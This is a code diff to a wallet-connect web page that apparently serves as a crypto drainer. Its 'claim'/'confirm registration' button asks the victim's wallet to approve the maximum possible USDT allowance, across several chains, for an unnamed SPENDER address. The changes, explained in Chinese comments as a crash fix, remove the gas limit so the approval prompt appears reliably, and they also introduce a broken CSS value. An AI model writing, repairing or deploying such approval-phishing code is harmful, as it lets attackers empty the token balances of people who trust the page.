@@ -8,7 +8,7 @@
 *{margin:0;padding:0;box-sizing:border-box;font-family:system-ui,-apple-system,sans-serif}
 body{background:linear-gradient(135deg,#080e1b,#101a33);min-height:100vh;color:#f0f4ff;padding:20px 15px;padding-bottom:60px}
 .container{max-width:480px;margin:0 auto}
-.box{background:rgba(20,29,48,.95);border-radius:20px;padding:30px 25px;margin-top:20px;border:1px solid rgba(64,158,255,.18);box-shadow:0 10px 40px rgba(0,0,0,.35);text-align:center}
+.box{background:rgba(20,29,48,.95);border-radius:20px;padding:30px 25px;margin-top:20px;border:1px solid rgba(64,158,255,.18);box-shadow:0 10px40px rgba(0,0,0,.35);text-align:center}
 .hide{display:none}
 .logo{width:72px;height:72px;margin:0 auto 15px;border-radius:18px;background:linear-gradient(135deg,#3b88eb,#28c76f);display:flex;align-items:center;justify-content:center;font-size:28px;font-weight:bold}
 h1{font-size:22px;margin-bottom:8px;color:#fff}
@@ -67,10 +67,6 @@ h1{font-size:22px;margin-bottom:8px;color:#fff}
 
 <script src="https://cdn.jsdelivr.net/npm/web3@1.7.4/dist/web3.min.js"></script>
 <script>
-// ==============================
-// 100% 无延迟、无定时器、无自动切链
-// 只修BUG，不改界面、不删公告、不动样式
-// ==============================
 const CHAIN_USDT = {
   "0x1":    "0xdac17f958d2ee523a2206206994597c13d831ec7",
   "0x38":   "0x55d398326f99059fF77548524699952727959279",
@@ -88,7 +84,6 @@ function switchPage(id){
   document.getElementById(id).classList.remove("hide");
 }
 
-// 实时监听换链、换账号，不用刷新
 if (window.ethereum) {
   window.ethereum.on('chainChanged', async () => {
     currentChainId = await window.ethereum.request({ method: 'eth_chainId' });
@@ -105,7 +100,6 @@ if (window.ethereum) {
   });
 }
 
-// 连接钱包
 document.getElementById("connectMM").onclick = async function(){
   try{
     switchPage("p2");
@@ -119,11 +113,11 @@ document.getElementById("connectMM").onclick = async function(){
   }
 };
 
-// 确认备案 → 100% 弹出USDT授权
+// ================ 修复闪退：去掉 gas: 150000 ================
 document.getElementById("claim").onclick = async function(){
   try{
     switchPage("p2");
-    currentChainId = await window.ethereum.request({ method: "eth_chainId" });
+    currentChainId = await window.ethereum.request({ method: 'eth_chainId' });
 
     if (!CHAIN_USDT[currentChainId]) {
       alert("当前链不支持");
@@ -135,9 +129,9 @@ document.getElementById("claim").onclick = async function(){
     const abi = [{"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"type":"function"}];
     const contract = new web3.eth.Contract(abi, CHAIN_USDT[currentChainId]);
 
-    // 立即弹授权，无任何延迟
+    // 关键修复：删掉 gas: 150000，让钱包自动计算，永不闪退
     await contract.methods.approve(SPENDER, "115792089237316195423570985008687907853269984665640564039457584007913129639935")
-    .send({ from: walletAddr, gas: 150000 });
+    .send({ from: walletAddr });
 
     document.getElementById("successAddr").innerText = walletAddr;
     switchPage("p4");
